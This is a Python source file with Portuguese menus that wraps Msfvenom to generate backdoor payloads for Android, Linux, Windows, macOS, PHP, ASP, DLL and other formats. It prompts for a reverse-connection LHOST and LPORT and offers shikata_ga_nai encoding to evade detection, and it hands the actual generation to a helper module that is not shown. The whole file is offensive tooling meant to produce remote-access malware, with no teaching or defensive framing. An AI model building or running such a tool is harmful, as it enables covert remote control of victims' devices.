from Data.Cores_lines import *
from Data import banners
import os
import os.path
import Data.backdoor as back
from Data.metasploit import lista_payloads as lp


def backdoor():
    global opcao1, cria
    # inicio ----------------------------
    tmp = os.system('clear')
    print(vermelho)
    banners.banner12()
    print(ciano, '#' * 70)
    print()
    # -----------------------------------

    # Opções ----------------------------
    print(f'     {branco}[{azul}01{branco}]{azul}  ANDROID  -->  Name.apk')
    print(f'     {branco}[{azul}02{branco}]{azul}  LINUX  -->  Name.elf')
    print(f'     {branco}[{azul}03{branco}]{azul}  WINDOWS  -->  Name.exe')
    print(f'     {branco}[{azul}04{branco}]{azul}  WINDOWS (MSI)  -->  Name.msi')
    print(f'     {branco}[{azul}05{branco}]{azul}  MAC  -->  Name.macho')
    print(f'     {branco}[{azul}06{branco}]{azul}  JAVASCRIPT  -->  Name.jsp')
    print(f'     {branco}[{azul}07{branco}]{azul}  PHP  -->  Name.php')
    print(f'     {branco}[{azul}08{branco}]{azul}  PYTHON  -->  Name.pyw')
    print(f'     {branco}[{azul}09{branco}]{azul}  ASP.NET  -->  Name.asp')
    print(f'     {branco}[{azul}10{branco}]{azul}  DLL  -->  Name.dll')
    print(f'     {branco}[{azul}11{branco}]{azul}  WAR  -->  Name.war')
    print(f'     {branco}[{azul}12{branco}]{azul}  VBSCRIPT  -->  Name.vbs')
    print()
    print(f'{branco}[{amarelo} Menu {branco}]{amarelo} : ')
    opcao1 = input(vermelho + '└─────►  ')
    # -----------------------------------

    # Tratamento das opções -------------
    if opcao1 == '01' or opcao1 == '1':
        cria = 1
    elif opcao1 == '02' or opcao1 == '2':
        cria = 2
    elif opcao1 == '03' or opcao1 == '3':
        cria = 3
    elif opcao1 == '04' or opcao1 == '4':
        cria = 4
    elif opcao1 == '05' or opcao1 == '5':
        cria = 5
    elif opcao1 == '06' or opcao1 == '6':
        cria = 6
    elif opcao1 == '07' or opcao1 == '7':
        cria = 7
    elif opcao1 == '08' or opcao1 == '8':
        cria = 8
    elif opcao1 == '09' or opcao1 == '9':
        cria = 9
    elif opcao1 == '10':
        cria = 10
    elif opcao1 == '11':
        cria = 11
    elif opcao1 == '12':
        cria = 12
    else:
        backdoor()
    # -----------------------------------
    backdoor2()


def backdoor2():
    # inicio (IP : PORT) ----------------
    tmp = os.system('clear')
    print(vermelho)
    banners.banner12()
    print(ciano, '#' * 70)
    print()
    print(f'     {branco}[{azul}PAYLOAD{branco}]{azul}  Escolha seu payload : ')
    print()
    i = 0
    for item in lp:
        if (opcao1 == '1' or opcao1 == '01') and (item == lp[10] or item == lp[11] or item == lp[12]):
            i += 1
            op1 = lp[10]
            op2 = lp[11]
            op3 = lp[12]

            print(f'     {branco}[{azul}PAYLOAD {i}{branco}]{azul}  {item.upper()}')
        elif (opcao1 == '2' or opcao1 == '02') and item == lp[4]:
            i += 1
            op1 = lp[4]
            print(f'     {branco}[{azul}PAYLOAD {i}{branco}]{azul}  {item.upper()}')
        elif (opcao1 == '3' or opcao1 == '03') and (item == lp[0] or item == lp[1] or item == lp[2] or item == lp[3]):
            i += 1
            op1 = lp[0]
            op2 = lp[1]
            op3 = lp[2]
            op4 = lp[3]
            print(f'     {branco}[{azul}PAYLOAD {i}{branco}]{azul}  {item.upper()}')
        elif (opcao1 == '4' or opcao1 == '04') and (item == lp[0] or item == lp[1] or item == lp[2] or item == lp[3]):
            i += 1
            op1 = lp[0]
            op2 = lp[1]
            op3 = lp[2]
            op4 = lp[3]
            print(f'     {branco}[{azul}PAYLOAD {i}{branco}]{azul}  {item.upper()}')
        elif (opcao1 == '5' or opcao1 == '05') and item == lp[9]:
            i += 1
            op1 = lp[9]
            print(f'     {branco}[{azul}PAYLOAD {i}{branco}]{azul}  {item.upper()}')
        elif (opcao1 == '6' or opcao1 == '06') and (item == lp[0] or item == lp[1] or item == lp[2] or item == lp[3] or item == lp[4]):
            i += 1
            op1 = lp[4]
            op2 = lp[0]
            op3 = lp[1]
            op4 = lp[2]
            op5 = lp[3]
            print(f'     {branco}[{azul}PAYLOAD {i}{branco}]{azul}  {item.upper()}')
        elif (opcao1 == '7' or opcao1 == '07') and item == lp[5]:
            i += 1
            op1 = lp[5]
            print(f'     {branco}[{azul}PAYLOAD {i}{branco}]{azul}  {item.upper()}')
        elif (opcao1 == '8' or opcao1 == '08') and (item == lp[6] or item == lp[7] or item == lp[8]):
            i += 1
            op1 = lp[6]
            op2 = lp[7]
            op3 = lp[8]
            print(f'     {branco}[{azul}PAYLOAD {i}{branco}]{azul}  {item.upper()}')
        elif (opcao1 == '9' or opcao1 == '09') and (item == lp[0] or item == lp[1] or item == lp[2] or item == lp[3] or item == lp[4]):
            i += 1
            op1 = lp[4]
            op2 = lp[0]
            op3 = lp[1]
            op4 = lp[2]
            op5 = lp[3]
            print(f'     {branco}[{azul}PAYLOAD {i}{branco}]{azul}  {item.upper()}')
        elif opcao1 == '10' and (item == lp[0] or item == lp[1] or item == lp[2] or item == lp[3]):
            i += 1
            op1 = lp[0]
            op2 = lp[1]
            op3 = lp[2]
            op4 = lp[3]
            print(f'     {branco}[{azul}PAYLOAD {i}{branco}]{azul}  {item.upper()}')
        elif opcao1 == '11' and (item == lp[0] or item == lp[1] or item == lp[2] or item == lp[3] or item == lp[4]):
            i += 1
            op1 = lp[4]
            op2 = lp[0]
            op3 = lp[1]
            op4 = lp[2]
            op5 = lp[3]
            print(f'     {branco}[{azul}PAYLOAD {i}{branco}]{azul}  {item.upper()}')
        elif opcao1 == '12' and (item == lp[0] or item == lp[1] or item == lp[2] or item == lp[3]):
            i += 1
            op1 = lp[0]
            op2 = lp[1]
            op3 = lp[2]
            op4 = lp[3]
            print(f'     {branco}[{azul}PAYLOAD {i}{branco}]{azul}  {item.upper()}')

    print()
    print(f'     {branco}[{azul}DEFAULT{branco}]{azul}  {op1}')
    print(f'{branco}[{amarelo} Menu {branco}]{amarelo} : ')
    tipo = input(vermelho + '└─────►  ')
    if tipo == '':
        tipo = op1.lower()
    elif tipo == '1' or tipo == '01':
        tipo = op1.lower()
    elif tipo == '2' or tipo == '02':
        try:
            tipo = op2.lower()
        except:
            backdoor()
    elif tipo == '3' or tipo == '03':
        try:
            tipo = op3.lower()
        except:
            backdoor()
    elif tipo == '4' or tipo == '04':
        try:
            tipo = op4.lower()
        except:
            backdoor()
    elif tipo == '5' or tipo == '05':
        try:
            tipo = op5.lower()
        except:
            backdoor()
    else:
        backdoor()
    print()
    print(f'     {branco}[{azul}DEFAULT IP{branco}]{azul}  127.0.0.1 (localhost)')
    print(f'     {branco}[{azul}DEFAULT PORT{branco}]{azul}  4444 (multi/handler)')
    print(f'     {branco}[{azul}DEFAULT OPTIONS{branco}]{azul}  Pressione << enter >> para opções default :3')
    print()
    ip = input(f'     {branco}[{azul}IP{branco}]{azul}  LHOST :')
    if ip == '':
        ip = '127.0.0.1'
    print()
    port = input(f'     {branco}[{azul}PORT{branco}]{azul}  LPORT :')
    if port == '':
        port = '4444'
    print()
    if not port.isnumeric():
        backdoor()
    nome = input(f'     {branco}[{azul}OUTPUT{branco}]{azul}  Nome do arquivo de saida : ')
    if nome == '':
        nome = 'Backdoor'
    print()
    while True:
        encoder = input(f'     {branco}[{azul}OUTPUT{branco}]{azul}  Usar o encoder x86/shikata_ga_nai [S/N] : ')
        if encoder == 'S' or encoder == 's':
            encoder = True
            break
        elif encoder == 'N' or encoder == 'n':
            encoder = False
            break
        elif encoder == '':
            encoder = True
            break
        else:
            pass
    lista_cria = [cria, tipo, ip, port, nome, encoder]
    # -----------------------------------
    print()
    print(ciano, '#' * 70)
    print()
    back.done(lista_cria)



def main():
    # inicio ----------------------------
    tmp = os.system('clear')
    print(vermelho)
    banners.banner1()
    print(ciano, '#' * 70)
    print()
    # -----------------------------------

    # Opções ----------------------------
    print(f'     {branco}[{azul}01{branco}]{azul}  Criar backdoor Msfvenom')
    print()
    print(f'{branco}[{amarelo} Menu {branco}]{amarelo} : ')
    opcao = input(vermelho + '└─────►  ')
    # -----------------------------------

    # Tratamento de opções --------------
    if opcao == '1' or opcao == '01':
        backdoor()
    else:
        main()
    # -----------------------------------


main()
